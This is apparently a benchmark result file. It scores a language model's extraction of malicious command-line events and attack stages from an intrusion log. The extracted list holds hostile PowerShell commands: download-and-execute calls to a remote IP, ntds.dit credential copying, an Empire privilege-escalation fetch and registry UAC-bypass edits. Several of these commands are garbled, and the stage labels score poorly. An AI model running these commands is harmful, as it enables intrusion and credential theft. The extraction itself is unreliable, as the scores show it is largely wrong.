@@ -1,0 +1,140 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\u0660\u0648\u221d\u2738\u221e\u2229\u221eB.ps1",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\\\"\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "esentutl.exe  /y /vss c:\\windows\\ntds\\ntds.dit /d c:\\ntds.dit",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1134.001 -TestNumbers 1\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"{[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose}",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1548.002 -TestNumbers 2\"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "Set-ItemProperty \\\"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\\\" -Name \\\"(default)\\\" -Value \\\"C:\\Windows\\System32\\cmd.exe\\\" -Force",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "reg add \\\"HKCU\\Environment\\\" /v \\\"windir\\\" /d \\\"cmd /c start powershell&REM \\\" ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "reg delete \\\"HKCU\\Environment\\\" /v \\\"windir\\\" /F",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-_ATOMICTest T1059.005  -TestNumbers 1\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"regar-add\\\"hkcu:\\software\\classes\\folder\\shell\\open\\command\\\"-value'cmd.ex/cnotepad.ex'",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-_ATOMICTest T1059.003 -GetPrereqs; Invoke-_ATOMICTest T1059.003\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Copy-Item '.\\msxsl.exe' 'c:\\Windows\\Temp\\msxsl.exe';Invoke-_ATOMICTest T1220  -TestNumbers 1\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1119 \"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest t1547.001 -TestNumbers 1\"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"reg add \\\"HKEY_LOCAL_MACHINE\\software\\microsoft\\windows nt\\currentversion\\image file execution options\\\" /v \\\"verifierdlls\\\" /d \\\"1\\\" /f\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"reg delete \\\"HKEY_LOCAL_MACHINE\\software\\microsoft\\windows nt\\currentversion\\image file execution options\\\" /v \\\"verifierdlls\\\" /f\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Get-WebContent -Uri http://124.223.85.207:8082/test.hta -FormFields @{type='submit'} -Passthru -Method POST -AllowUntrustedSSL -UserAgent 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; Trident/6.0)'\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1220  -TestNumbers 1\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1546.008 -TestNumbers 1 -Cleanup\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/test.hta -Method 'POST' -UseBasicParsing -ContentType \\\"application/json\\\"\"",
+        "stage": "Command and Control"
+      }
+    ],
+    "narrative": "An attacker initially gained access to the system via a PowerShell exploit (.ps1 file), downloaded additional payloads through HTTP requests, escalated privileges using Empire tools, collected sensitive information such as credentials and system info, established persistence through registry modifications, evaded defenses by modifying environment variables and disabling image file verification, executed various atomic tests, and maintained command and control through web content downloads.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 19257,
+      "completion_tokens": 1235,
+      "total_tokens": 20492,
+      "wall_clock_s": 62.845,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.18181818181818182,
+      "recall": 0.17391304347826086,
+      "f1": 0.17777777777777776,
+      "tp": 4,
+      "fp": 18,
+      "fn": 19
+    },
+    "stage": {
+      "precision": 0.09090909090909091,
+      "recall": 0.08695652173913043,
+      "f1": 0.08888888888888888,
+      "tp": 2,
+      "fp": 20,
+      "fn": 21,
+      "recall_partial": 0.13043478260869565
+    },
+    "hallucination_rate": 0.16666666666666666,
+    "cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 19257,
+      "completion_tokens": 1235,
+      "total_tokens": 20492,
+      "wall_clock_s": 62.845,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "scale_v4",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true,
+    "got_link_hints": false
+  }
+}
